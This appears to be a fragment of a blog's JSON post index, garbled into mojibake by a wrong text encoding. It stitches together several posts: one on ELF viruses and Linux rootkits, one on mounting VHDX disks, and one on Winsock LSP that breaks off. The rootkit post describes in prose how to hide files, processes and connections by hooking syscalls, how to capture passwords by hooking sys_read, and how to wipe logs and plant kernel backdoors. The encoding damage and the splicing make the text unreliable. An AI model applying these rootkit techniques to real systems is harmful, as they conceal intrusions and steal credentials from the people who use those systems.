è¯¥ç—…æ¯’ä»¥å¯„ç”Ÿæ–¹å¼æŒ‚æ¥åˆ°äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸ç®¡è¯¥æ–‡ä»¶èƒ½å¦ç›´æ¥æ‰§è¡Œï¼‰ã€‚äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«å¯ç”± CPU ç›´æ¥è§£é‡Šçš„äºŒè¿›åˆ¶æŒ‡ä»¤ã€‚è¿™äº›ç±»å‹çš„ç—…æ¯’é€šå¸¸ç§°ä¸ºæ–‡ä»¶æ„ŸæŸ“å‹ç—…æ¯’ã€‚\nELFç—…æ¯’åŸç† æ¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªæ§åˆ¶æµï¼Œå³æ‰§è¡Œè·¯å¾„ï¼Œè€Œelfç—…æ¯’çš„é¦–è¦ç›®æ ‡æ˜¯åŠ«æŒæ§åˆ¶æµï¼Œæš‚æ—¶æ”¹å˜ç¨‹åºçš„æ‰§è¡Œè·¯å¾„æ¥æ‰§è¡Œå¯„ç”Ÿä»£ç ã€‚ å¯„ç”Ÿä»£ç é€šå¸¸è´Ÿè´£è®¾ç½®é’©å­æ¥åŠ«æŒå‡½æ•°ï¼Œè¿˜ä¼šå°†è‡ªèº«ä»£ç å¤åˆ¶åˆ°æ²¡æœ‰æ„ŸæŸ“ç—…æ¯’çš„ç¨‹åºä¸­ã€‚ä¸€æ—¦å¯„ç”Ÿä»£ç æ‰§è¡Œå®Œæˆï¼Œå°±ä¼šè·³åˆ°åŸå§‹çš„å…¥å£ç‚¹æˆ–æ­£å¸¸çš„æ‰§è¡Œè·¯å¾„ä¸Šï¼Œè¿™æ ·å°±ä½¿å¾—ç—…æ¯’ä¸å®¹æ˜“è¢«å‘ç°ã€‚ å¦å¤–ï¼Œä¸€ä¸ªçœŸæ­£çš„ELFç—…æ¯’åº”è¯¥å…·æœ‰ä¸‹é¢çš„ç‰¹ç‚¹ï¼š\n èƒ½æ„ŸæŸ“å¯æ‰§è¡Œæ–‡ä»¶ å¯„ç”Ÿä»£ç å¿…é¡»æ˜¯ç‹¬ç«‹çš„ï¼Œèƒ½å¤Ÿåœ¨ç‰©ç†ä¸Šå¯„å­˜ä¸å¦ä¸€ä¸ªç¨‹åºå†…éƒ¨ï¼Œä¸èƒ½ä¾èµ–åŠ¨æ€é“¾æ¥å™¨é“¾æ¥å¤–éƒ¨çš„åº“ã€‚ç‹¬ç«‹äºå…¶ä»–æ–‡ä»¶ã€ä»£ç åº“ã€ç¨‹åºç­‰ã€‚ è¢«æ„ŸæŸ“çš„å®¿ä¸»æ–‡ä»¶èƒ½ç»§ç»­æ‰§è¡Œå¹¶ä¼ æ’­ç—…æ¯’   About ELFç—…æ¯’ï¼š\nELFç—…æ¯’åˆ†æ\nè‡ªå·±åŠ¨æ‰‹å†™ç—…æ¯’â€”ELFæ–‡ä»¶ç—…æ¯’\nã€ŠlinuxäºŒè¿›åˆ¶åˆ†æã€‹è¯»ä¹¦ç¬”è®°æ€»ç»“--ELFç—…æ¯’æŠ€æœ¯-linux/unixç—…æ¯’\nã€æŠ€æœ¯åˆ†äº«ã€‘å¦‚ä½•ä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ä¸€ä¸ªç—…æ¯’\n Rootkit  Reference:\nRootkit-wiki\nhttp://read.pudn.com/downloads83/doc/319249/%E5%86%85%E6%A0%B8%E7%BA%A7%E5%90%8E%E9%97%A8Rootkit%E6%8A%80%E6%9C%AF.pdf\nã€æŠ€æœ¯åˆ†äº«ã€‘RootkitæŠ€æœ¯å…¥é—¨ï¼šä»syscallåˆ°hookï¼\n rootkitçš„ä¸»è¦åˆ†ç±»ï¼š  åº”ç”¨çº§ å†…æ ¸çº§ ç¡¬ä»¶çº§  æ—©æœŸçš„rootkitä¸»è¦ä¸ºåº”ç”¨çº§rootkitï¼Œåº”ç”¨çº§rootkitä¸»è¦é€šè¿‡æ›¿æ¢loginã€psã€lsã€netstatç­‰ç³»ç»Ÿå·¥å…·ï¼Œæˆ–ä¿®æ”¹.rhostsç­‰ç³»ç»Ÿé…ç½®æ–‡ä»¶ç­‰å®ç°éšè—åŠåé—¨ï¼›ç¡¬ä»¶çº§rootkitä¸»è¦æŒ‡bios rootkitï¼Œå¯ä»¥åœ¨ç³»ç»ŸåŠ è½½å‰è·å¾—æ§åˆ¶æƒï¼Œé€šè¿‡å‘ç£ç›˜ä¸­å†™å…¥æ–‡ä»¶ï¼Œå†ç”±å¼•å¯¼ç¨‹åºåŠ è½½è¯¥æ–‡ä»¶é‡æ–°è·å¾—æ§åˆ¶æƒï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨è™šæ‹ŸæœºæŠ€æœ¯ï¼Œä½¿æ•´ä¸ªæ“ä½œç³»ç»Ÿè¿è¡Œåœ¨rootkitæŒæ¡ä¹‹ä¸­ï¼›ç›®å‰æœ€å¸¸è§çš„rootkitæ˜¯å†…æ ¸çº§rootkitã€‚\nå†…æ ¸çº§rootkitåˆå¯åˆ†ä¸ºlkm rootkitã€élkm rootkitã€‚lkm rootkitä¸»è¦åŸºäºlkmæŠ€æœ¯ï¼Œé€šè¿‡ç³»ç»Ÿæä¾›çš„æ¥å£åŠ è½½åˆ°å†…æ ¸ç©ºé—´ï¼Œæˆä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œè¿›è€Œé€šè¿‡hookç³»ç»Ÿè°ƒç”¨ç­‰æŠ€æœ¯å®ç°éšè—ã€åé—¨åŠŸèƒ½ã€‚élkm rootkitä¸»è¦æ˜¯æŒ‡åœ¨ç³»ç»Ÿä¸æ”¯æŒlkmæœºåˆ¶æ—¶ä¿®æ”¹å†…æ ¸çš„ä¸€ç§æ–¹æ³•ï¼Œä¸»è¦é€šè¿‡/dev/memã€/dev/kmemè®¾å¤‡ç›´æ¥æ“ä½œå†…å­˜ï¼Œä»è€Œå¯¹å†…æ ¸è¿›è¡Œä¿®æ”¹ã€‚\n linux lkm rootkitå¸¸ç”¨æŠ€å·§\nLKMï¼šLoadable Kernel Modulesï¼Œå†…æ ¸æ¨¡å—åŠ¨æ€åŠ è½½æŠ€æœ¯ï¼Œinsmodã€lsmodç­‰å¯ç›´æ¥å¯¹å†…æ ¸æ¨¡å—è¿›è¡Œæ“ä½œ\nå¯åŠ¨æ€æ›´æ”¹æ˜¯æŒ‡å…è®¸å†…æ ¸åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°å‘å…¶ä¸­æ’å…¥æˆ–ä»ä¸­åˆ é™¤ä»£ç ã€‚è¿™äº›ä»£ç åŒ…æ‹¬ç›¸å…³çš„å­ä¾‹ç¨‹ã€æ•°æ®ã€å‡½æ•°å…¥å£å’Œå‡½æ•°å‡ºå£è¢«ä¸€å¹¶ç»„åˆåœ¨ä¸€ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶é•œåƒä¸­ï¼Œå³æ‰€è°“çš„å¯è£…è½½å†…æ ¸æ¨¡å—ä¸­ï¼Œæˆ–è¢«ç®€ç§°ä¸ºæ¨¡å—ã€‚\n élkm rootkitè¦å®ç°å¯¹å†…æ ¸çš„ä¿®æ”¹ï¼Œé¦–å…ˆéœ€è¦è·å¾—å†…æ ¸ç©ºé—´çš„å†…å­˜ï¼Œå› æ­¤éœ€è¦è°ƒç”¨kmallocåˆ†é…å†…å­˜ï¼Œè€Œkmallocæ˜¯å†…æ ¸ç©ºé—´çš„è°ƒç”¨ï¼Œæ— æ³•åœ¨ç”¨æˆ·ç©ºé—´ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œå› æ­¤æƒ³åˆ°äº†é€šè¿‡int 0x80è°ƒç”¨è¯¥å‡½æ•°çš„æ–¹æ³•ã€‚å…ˆé€‰æ‹©ä¸€ä¸ªä¸å¸¸è§çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œåœ¨sys_call_tableä¸­æ‰¾åˆ°è¯¥é¡¹ï¼Œé€šè¿‡å†™/dev/memç›´æ¥å°†å…¶ä¿®æ”¹ä¸º kmallocå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å½“æˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´è°ƒç”¨è¯¥ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°±èƒ½é€šè¿‡int 0x80è¿›å…¥å†…æ ¸ç©ºé—´ï¼Œæ‰§è¡Œkmallocå‡½æ•°åˆ†é…å†…å­˜ï¼Œå¹¶å°†åˆ†é…å¥½çš„å†…å­˜åœ°å€ç”±eaxå¯„å­˜å™¨è¿”å›ï¼Œä»è€Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€å—å±äºå†…æ ¸åœ°å€ç©ºé—´çš„å†…å­˜ï¼Œæ¥ç€å°†è¦ hackçš„å‡½æ•°å†™å…¥è¯¥å†…å­˜ï¼Œå¹¶å†æ¬¡ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œå°±èƒ½å®ç°hookç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½ã€‚\nrootkitçš„å¸¸è§åŠŸèƒ½ éšè—æ–‡ä»¶ï¼šé€šè¿‡strace lså¯ä»¥å‘ç°lså‘½ä»¤å…¶å®æ˜¯é€šè¿‡sys_getdents64è·å¾—æ–‡ä»¶ç›®å½•çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹sys_getdents64ç³»ç»Ÿè°ƒç”¨æˆ–è€…æ›´åº•å±‚çš„ readdirå®ç°éšè—æ–‡ä»¶åŠç›®å½•ï¼Œè¿˜æœ‰å¯¹ext2æ–‡ä»¶ç³»ç»Ÿç›´æ¥è¿›è¡Œä¿®æ”¹çš„æ–¹æ³•ï¼Œä¸è¿‡å®ç°èµ·æ¥ä¸å¤Ÿæ–¹ä¾¿ï¼Œä¹Ÿæœ‰ä¸€äº›å…·ä½“çš„é™åˆ¶ã€‚\néšè—è¿›ç¨‹ï¼šéšè—è¿›ç¨‹çš„æ–¹æ³•å’Œéšè—æ–‡ä»¶ç±»ä¼¼ï¼Œpså‘½ä»¤æ˜¯é€šè¿‡è¯»å–/procæ–‡ä»¶ç³»ç»Ÿä¸‹çš„è¿›ç¨‹ç›®å½•è·å¾—è¿›ç¨‹ä¿¡æ¯çš„ï¼Œåªè¦èƒ½å¤Ÿéšè—/procæ–‡ä»¶ç³»ç»Ÿä¸‹çš„è¿›ç¨‹ç›®å½•å°±å¯ä»¥è¾¾åˆ°éšè—è¿›ç¨‹çš„æ•ˆæœï¼Œå³hook sys_getdents64å’Œreaddirç­‰ã€‚\néšè—è¿æ¥ï¼šnetstatå‘½ä»¤æ˜¯é€šè¿‡è¯»å–/procæ–‡ä»¶ç³»ç»Ÿä¸‹çš„net/tcpå’Œnet/udpæ–‡ä»¶è·å¾—å½“å‰è¿æ¥ä¿¡æ¯ï¼Œå› æ­¤å¯ä»¥é€šè¿‡hook sys_readè°ƒç”¨å®ç°éšè—è¿æ¥ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹tcp4_seq_showå’Œudp4_seq_showç­‰å‡½æ•°å®ç°ã€‚\néšè—æ¨¡å—ï¼šlsmodå‘½ä»¤ä¸»è¦æ˜¯é€šè¿‡sys_query_moduleç³»ç»Ÿè°ƒç”¨è·å¾—æ¨¡å—ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡hook sys_query_moduleç³»ç»Ÿè°ƒç”¨éšè—æ¨¡å—ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å°†æ¨¡å—ä»å†…æ ¸æ¨¡å—é“¾è¡¨ä¸­æ‘˜é™¤ä»è€Œè¾¾åˆ°éšè—æ•ˆæœã€‚\nå—…æ¢å·¥å…·ï¼šå—…æ¢å·¥å…·å¯ä»¥é€šè¿‡libpcapåº“ç›´æ¥è®¿é—®é“¾è·¯å±‚ï¼Œæˆªè·æ•°æ®åŒ…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡linuxçš„netfilteræ¡†æ¶åœ¨IPå±‚çš„hookç‚¹ä¸Šæˆªè·æ•°æ®åŒ…ã€‚å—…æ¢å™¨è¦è·å¾—ç½‘ç»œä¸Šçš„å…¶ä»–æ•°æ®åŒ…éœ€è¦å°†ç½‘å¡è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼ï¼Œè¿™æ˜¯é€šè¿‡ioctlç³»ç»Ÿè°ƒç”¨çš„SIOCSIFFLAGSå‘½ä»¤å®ç°çš„ï¼ŒæŸ¥çœ‹ç½‘å¡çš„å½“å‰æ¨¡å¼æ˜¯é€šè¿‡SIOCGIFFLAGSå‘½ä»¤ï¼Œå› æ­¤å¯ä»¥é€šè¿‡hook sys_ioctléšè—ç½‘å¡çš„æ··æ‚æ¨¡å¼ã€‚\nå¯†ç è®°å½•ï¼šå¯†ç è®°å½•å¯ä»¥é€šè¿‡hook sys_readç³»ç»Ÿè°ƒç”¨å®ç°ï¼Œæ¯”å¦‚é€šè¿‡åˆ¤æ–­å½“å‰è¿è¡Œçš„è¿›ç¨‹åæˆ–è€…å½“å‰ç»ˆç«¯æ˜¯å¦å…³é—­å›æ˜¾ï¼Œå¯ä»¥è·å–ç”¨æˆ·çš„è¾“å…¥å¯†ç ã€‚hook sys_readè¿˜å¯ä»¥å®ç°loginåé—¨ç­‰å…¶å®ƒåŠŸèƒ½ã€‚\næ—¥å¿—æ“¦é™¤ï¼šä¼ ç»Ÿçš„unixæ—¥å¿—ä¸»è¦åœ¨/var/log/messagesï¼Œ/var/log/lastlogï¼Œ/var/run/utmpï¼Œ/var /log/wtmpä¸‹ï¼Œå¯ä»¥é€šè¿‡ç¼–å†™ç›¸åº”çš„å·¥å…·å¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œè¿˜å¯ä»¥å°†HISTFILEç­‰ç¯å¢ƒå˜è®¾ä¸º/dev/nulléšè—ç”¨æˆ·çš„ä¸€äº›æ“ä½œä¿¡æ¯ã€‚\nå†…æ ¸åé—¨ï¼šå¯ä»¥æ˜¯æœ¬åœ°çš„ææƒåé—¨å’Œç½‘ç»œçš„ç›‘å¬åé—¨ï¼Œæœ¬åœ°çš„ææƒå¯ä»¥é€šè¿‡å¯¹å†…æ ¸æ¨¡å—å‘é€å®šåˆ¶å‘½ä»¤å®ç°ï¼Œç½‘ç»œå†…æ ¸åé—¨å¯ä»¥åœ¨IPå±‚å¯¹è¿›å…¥ä¸»æœºçš„æ•°æ®åŒ…è¿›è¡Œç›‘å¬ï¼Œå‘ç°åŒ¹é…çš„æŒ‡å®šæ•°æ®åŒ…åç«‹åˆ»å¯åŠ¨å›è¿è¿›ç¨‹ã€‚\nrootkitçš„ä¸»è¦æŠ€æœ¯ lkmæ³¨å°„ã€æ¨¡å—æ‘˜é™¤ã€æ‹¦æˆªä¸­æ–­ï¼ˆ0x80ã€0x01ï¼‰ã€åŠ«æŒç³»ç»Ÿè°ƒç”¨ã€è¿è¡Œæ—¶è¡¥ä¸ã€inline hookã€ç«¯å£åå¼¹â€¦â€¦\nlkmæ³¨å°„ï¼šä¹Ÿæ˜¯ä¸€ç§éšè—å†…æ ¸æ¨¡å—çš„æ–¹æ³•ï¼Œé€šè¿‡æ„ŸæŸ“ç³»ç»Ÿçš„lkmï¼Œåœ¨ä¸å½±å“åŸæœ‰åŠŸèƒ½çš„æƒ…å†µä¸‹å°†rootkitæ¨¡å—é“¾æ¥åˆ°ç³»ç»Ÿlkmä¸­ï¼Œåœ¨æ¨¡å—è¿è¡Œæ—¶è·å¾—æ§åˆ¶æƒï¼Œåˆå§‹åŒ–åè°ƒç”¨ç³»ç»Ÿlkmçš„åˆå§‹åŒ–å‡½æ•°ï¼Œlkmæ³¨å°„æ¶‰åŠåˆ°elfæ–‡ä»¶æ ¼å¼ä¸æ¨¡å—åŠ è½½æœºåˆ¶ã€‚\næ¨¡å—æ‘˜é™¤ï¼šä¸»è¦æ˜¯æŒ‡å°†æ¨¡å—ä»æ¨¡å—é“¾è¡¨ä¸­æ‘˜é™¤ä»è€Œéšè—æ¨¡å—çš„æ–¹æ³•ï¼Œæœ€æ–°åŠ è½½çš„æ¨¡å—æ€»æ˜¯åœ¨æ¨¡å—é“¾è¡¨çš„è¡¨å¤´ï¼Œå› æ­¤å¯ä»¥åœ¨åŠ è½½å®Œrootkitæ¨¡å—åå†åŠ è½½ä¸€ä¸ªæ¸…é™¤æ¨¡å—å°†rootkitæ¨¡å—ä¿¡æ¯ä»é“¾è¡¨ä¸­åˆ é™¤ï¼Œå†é€€å‡ºæ¸…é™¤æ¨¡å—ï¼Œæ–°ç‰ˆæœ¬å†…æ ¸ä¸­ä¹Ÿå¯ä»¥é€šè¿‡åˆ¤æ–­æ¨¡å—ä¿¡æ¯åç›´æ¥list_delã€‚\næ‹¦æˆªä¸­æ–­ï¼šä¸»è¦é€šè¿‡sidtæŒ‡ä»¤è·å¾—ä¸­æ–­è°ƒç”¨è¡¨çš„åœ°å€ï¼Œè¿›è€Œè·å–ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ï¼Œä¿®æ”¹å¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå¦‚int 0x80ï¼Œint 0x1ç­‰ã€‚å…¶ä¸­æ‹¦æˆªint 0x1æ˜¯è¾ƒæ–°çš„æŠ€æœ¯ï¼Œä¸»è¦åˆ©ç”¨ç³»ç»Ÿçš„è°ƒè¯•æœºåˆ¶ï¼Œé€šè¿‡è®¾ç½®DRå¯„å­˜å™¨åœ¨è¦æ‹¦æˆªçš„å†…å­˜åœ°å€ä¸Šä¸‹æ–­ç‚¹ï¼Œä»è€Œåœ¨æ‰§è¡Œåˆ°æŒ‡å®šæŒ‡ä»¤æ—¶è½¬å…¥0x1ä¸­æ–­çš„å¤„ç†ç¨‹åºï¼Œé€šè¿‡ä¿®æ”¹0x1ä¸­æ–­çš„å¤„ç†ç¨‹åºå³å¯å®ç°æƒ³è¦çš„åŠŸèƒ½ã€‚\nåŠ«æŒç³»ç»Ÿè°ƒç”¨ï¼šå’Œæ‹¦æˆªä¸­æ–­ç±»ä¼¼ï¼Œä½†ä¸»è¦æ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨è¡¨è¿›è¡Œä¿®æ”¹ï¼Œå¯ä»¥ç›´æ¥æ›¿æ¢åŸç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨çš„å…¥å£åœ°å€ã€‚åœ¨2.4å†…æ ¸ä¹‹å‰ï¼Œå†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨è¡¨åœ°å€æ˜¯å¯¼å‡ºçš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚ä½†åœ¨2.6å†…æ ¸ä¹‹åï¼Œç³»ç»Ÿè°ƒç”¨è¡¨çš„åœ°å€å·²ç»ä¸å†å¯¼å‡ºï¼Œéœ€è¦å¯¹0x80ä¸­æ–­å¤„ç†ç¨‹åºè¿›è¡Œåˆ†æä»è€Œè·å–ç³»ç»Ÿè°ƒç”¨è¡¨çš„åœ°å€ã€‚\nè¿è¡Œæ—¶è¡¥ä¸ï¼šå­—ç¬¦è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œå—è®¾å¤‡é©±åŠ¨ç¨‹åºåœ¨åŠ è½½æ—¶éƒ½ä¼šå‘ç³»ç»Ÿæ³¨å†Œä¸€ä¸ªStruct file_operationsç»“æ„å®ç°æŒ‡å®šçš„readã€writeç­‰æ“ä½œï¼Œæ–‡ä»¶ç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼Œé€šè¿‡ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿçš„file_operationsç»“æ„ï¼Œå¯ä»¥å®ç°æ–°çš„readã€writeæ“ä½œç­‰ã€‚\ninline hookï¼šä¸»è¦æ˜¯æŒ‡å¯¹å†…å­˜ä¸­çš„å†…æ ¸å‡½æ•°ç›´æ¥ä¿®æ”¹ï¼Œè€Œä¸å½±å“åŸå…ˆçš„åŠŸèƒ½ï¼Œå¯ä»¥é‡‡ç”¨è·³è½¬çš„åŠæ³•ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹å¯¹ä¸‹å±‚å‡½æ•°çš„call offsetå®ç°ã€‚\nç«¯å£åå¼¹ï¼šä¸»è¦æ˜¯ä¸ºäº†æ›´å¥½çš„çªç ´é˜²ç«å¢™çš„é™åˆ¶ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯ä¸Šç›‘å¬80ç«¯å£ï¼Œè€Œåœ¨æœåŠ¡å™¨ç«¯é€šè¿‡å¯¹å®¢æˆ·ç«¯çš„80ç«¯å£è¿›è¡Œå›è¿ï¼Œä¼ªè£…æˆä¸€ä¸ªè®¿é—®webæœåŠ¡çš„æ­£å¸¸è¿›ç¨‹ä»è€Œçªç ´é˜²ç«å¢™çš„é™åˆ¶ã€‚\n","description":"","tags":["virus","reverse"],"title":"Computer-Virus","uri":"/posts/computer-virus/"},{"categories":[],"content":"Virtual Hard Disk ä¸€ç›´å¾ˆå¥½å¥‡è€å¸ˆç”¨çš„.vhdxæ˜¯å•¥ï¼ŒçŸ¥é“ä»–å‘æ¥äº†ä¸€ä¸ª.vhdxæ–‡ä»¶æ ¼å¼çš„ä¸œè¥¿æˆ‘æ‰å¼€å§‹äº†è§£\n èµ„æ–™ï¼š\nvhdx-wiki\nUnderstanding and Working with VHD(X) Files\nwindowsçš„è™šæ‹Ÿç£ç›˜ï¼ˆvhdï¼Œvhdxï¼‰ä½¿ç”¨\nlinux æŒ‚åœ¨vhdxçš„æ–¹æ³•\nlinuxä¸‹æŒ‚è½½VHDç­‰è™šæ‹Ÿç£ç›˜æ–‡ä»¶\n vhdæ˜¯ä¸€ç§è™šæ‹Ÿç¡¬ç›˜çš„æ–‡ä»¶æ ¼å¼ï¼Œä»–å¯ä»¥åŒ…å«èƒ½åœ¨ç‰©ç†HDDä¸Šæ‰¾åˆ°çš„å†…å®¹ï¼Œæ¯”å¦‚ç£ç›˜åˆ†åŒºå’Œæ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥åŒ…å«æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œé€šå¸¸ç”¨ä½œè™šæ‹Ÿæœºçš„ç¡¬ç›˜ï¼Œè€Œvhdxæ˜¯ç¬¬äºŒä»£çš„vhdï¼Œåœ¨æ€§èƒ½ä¸Šä¹Ÿæœ‰æ‰€ä¸åŒ\n vhdxåœ¨windows 8å’Œwindows server 2012ä¹‹åè¢«æ”¯æŒ vhdçš„å®¹é‡é™åˆ¶ä¸º2040GBï¼Œè€Œvhdxæœ€å¤šä¸º64TB vhdxå¯é˜²æ­¢ç”µæºæ•…éšœï¼Œå¹¶ç”±hyper-Vä½¿ç”¨  åŠŸèƒ½æœ‰ï¼š\n åœ¨vhdå’Œä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¹‹é—´ç§»åŠ¨æ–‡ä»¶ å¤‡ä»½ä¸è¿˜åŸ é˜²ç—…æ¯’å’Œå®‰å…¨æ€§ å›¾åƒç®¡ç†å’Œä¿®è¡¥ ç£ç›˜è½¬æ¢ï¼šç‰©ç†åˆ°è™šæ‹Ÿï¼Œè™šæ‹Ÿåˆ°ç‰©ç† ç”Ÿå‘½å‘¨æœŸç®¡ç†å’Œé‡æ–°é…ç½®  VHDXæ¨¡æ‹Ÿç¡¬ç›˜ï¼Œä¸æ–‡ä»¶ç³»ç»Ÿçš„æ ¼å¼æ— å…³ï¼Œä¹Ÿä¸åˆ†åŒºæ— å…³ã€‚vhdxå…·æœ‰ä¸ç‰©ç†ç¡¬ç›˜é©±åŠ¨å™¨ç›¸åŒçš„ç‰¹å¾ã€‚å‡å¦‚åˆ›å»ºä¸€ä¸ªntfsæ ¼å¼çš„vhdxå°±å¦‚ä¸Šå›¾æ‰€ç¤º\nè€å¸ˆç»™çš„vhdxä½¿ç”¨æ”»ç•¥ ç”±äºæˆ‘çš„ç¡¬ç›˜å¿«ç‚¸äº†å°±ä¸å®éªŒè¿™ä¸ªäº†\nä¸‹è½½vhdxæ–‡ä»¶ï¼Œæ”¾åˆ°ä¸€ä¸ªå¦¥å¸–çš„åœ°æ–¹å¤‡ä»½å…ˆã€‚ ä¸€ä¸ªæœ‰ç©ºé—²80Gä»¥ä¸Šçš„ç¡¬ç›˜æ¯”å¦‚E:ï¼Œè§£å‹ç¼©vhdxæ”¾åˆ°e:ä¸‹ â€œä»¥ç®¡ç†å‘˜èº«ä»½â€è¿è¡Œâ€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œæ‰§è¡Œï¼š bcdedit /copy {current} -d \"windows 10 x64 v2004 20h1 b19041\" ä¼šè¿”å›ä¸€ä¸ªuuidï¼Œåƒè¿™æ ·å­ï¼š {78088406-4d9e-11e9-951e-97df5fa30904} ç„¶åç»§ç»­æ‰§è¡Œï¼ˆæ³¨æ„uuidæ¢æˆä½ è¿”å›çš„ï¼‰ï¼ˆæ³¨æ„æŠŠEæ¢æˆä½ çš„ç›˜ç¬¦ï¼Œå¤§æ‹¬å·ä¸­æ‹¬å·è¦ä¿æŒä¸è¦åˆ ï¼‰ bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} osdevice vhd=[e:]\\Windows10x64-v2004-20h1-b19041.vhdx bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} device vhd=[e:]\\Windows10x64-v2004-20h1-b19041.vhdx bcdedit /set {78088406-4d9e-11e9-951e-97df5fa30904} hypervisorlaunchtype OFF ç„¶åé‡å¼€æœºï¼Œæ³¨æ„æœ‰ä¸ªå¼€æœºé€‰æ‹©èœå•ï¼Œ é€‰è¿™ä¸ªv2004å³å¯è¿›å…¥æ–°çš„windows ä¸é€‰æˆ–ç›´æ¥å›è½¦çš„è¯ï¼Œä¼šç»§ç»­æ—§çš„windowsã€‚ å°†æ¥å¦‚æœæƒ³åˆ æ‰ï¼Œç›´æ¥æŠŠvhdxåˆ æ‰å°±å®Œäº‹äº†ã€‚ é™„ $ md5sum W* 52cd80b26541bb92e306291362a930cb *Windows10x64-v2004-20h1-b19041.7z fc99df570f50bd7b4cfd0b08a905a11e *Windows10x64-v2004-20h1-b19041.vhdx windowsä¸‹ä½¿ç”¨ windowsä¸‹å¯ä»¥ç”¨ç£ç›˜ç®¡ç†å»åˆ›å»ºæˆ–é™„åŠ \nå³é”®å¼€å§‹èœå•æˆ–è€…win+Rè¿è¡Œdiskmgmt.mscå‘½ä»¤ï¼Œæ‰“å¼€ç£ç›˜ç®¡ç†å·¥å…·\né€‰æ‹©ä¸€ä¸ªç¡¬ç›˜ï¼Œåœ¨èœå•ä¸­ç‚¹å‡»æ“ä½œï¼Œåˆ›å»ºVHDå³å¯\nå¸è½½ å»ç£ç›˜ç®¡ç†å·¥å…·ï¼Œç‚¹å‡»å¯¹ç¡¬ç›˜ï¼Œåˆ†ç¦»vhd\nLinuxä¸‹ä½¿ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # file:install_tools.sh # install qemu utils sudo apt install qemu-utils # install nbd client sudo apt install nbd-client #------------------------------------ #file:mount_vhdx.sh #!/bin/bash VHDX_IMG=\"$1\" MOUNT_POINT=\"$2\" # [ubuntu] How do you mount a VHD image # https://ubuntuforums.org/showthread.php?t=2299701 #  # Load the nbd kernel module. sudo rmmod nbd;sudo modprobe nbd max_part=16 # mount block device sudo qemu-nbd -c /dev/nbd0 \"$VHDX_IMG\" # reload partition table sudo partprobe /dev/nbd0 # mount partition sudo mount -o rw,nouser /dev/nbd0p1 \"$MOUNT_POINT\" #----------------------------------------- #file:unmount_vhdx.sh #!/bin/bash MOUNT_POINT=\"$1\" #unmount \u0026 remove nbd module sudo umount \"$MOUNT_POINT\" \u0026\u0026 sudo qemu-nbd -d /dev/nbd0 \u0026\u0026 sudo rmmod nbd   ","description":"something about vhdx\u0026vhd","tags":[],"title":"Virtual_hard_disk","uri":"/posts/virtual_hard_disk/"},{"categories":["network"],"content":"åº åŸæœ¬åªæ˜¯æƒ³ç™½å«–å…è´¹çš„è…¾è®¯åŠ é€Ÿå™¨ï¼Œç”¨å®Œå¸äº†ï¼Œæ²¡æƒ³åˆ°è¿˜å¸è½½ä¸äº†ã€‚\nå…¶ä¸­æœ‰ä¸¤ä¸ªdllåˆ é™¤æ—¶æ€»æ˜¯æ˜¾ç¤ºæ­£åœ¨è¿è¡Œä¸­ï¼Œç”¨tasklist /m xxx.dllæŸ¥çœ‹è¿è¡Œdllçš„è¿›ç¨‹ï¼Œä¸€ä¸€ç»ˆæ­¢ï¼Œç„¶åæŠŠä»–åˆ äº†ã€‚\nç„¶åå‘ç°ï¼Œæˆ‘ç½‘ç»œç‚¸äº†ï¼Ÿï¼Ÿï¼Ÿ\nssrä¹Ÿè¢«åŠ é€Ÿå™¨é¡ºä¾¿ç»™ç‚¸äº†ï¼Œæ˜¾ç¤ºç»‘å®šäº†å¦å¤–ä¸€ä¸ªç«¯å£\n å‚è€ƒï¼š\nåˆ†å±‚æœåŠ¡æä¾›ç¨‹åº\nLSP-wiki\nLSPåŠ«æŒä¸ç½‘ç»œæ•°æ®è½¬å‘ä»£ç†æœåŠ¡å™¨çš„å¿ƒå¾—ç¬”è®°\n Winsock LSPå…¨ç§°Windows Socket Layered Service 